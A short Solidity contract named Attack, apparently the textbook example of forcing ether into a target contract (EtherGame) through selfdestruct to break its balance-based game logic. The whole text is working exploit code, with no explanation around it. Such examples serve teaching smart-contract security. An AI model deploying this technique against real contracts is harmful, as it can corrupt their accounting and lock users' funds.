contract Attack {     
   EtherGame etherGame;      
   constructor(EtherGame _etherGame) {         
      etherGame = EtherGame(_etherGame);     
   }      
   function attack() public payable {         
      
      
      
      address payable addr = payable(address(etherGame));              
      selfdestruct(addr);
   } }
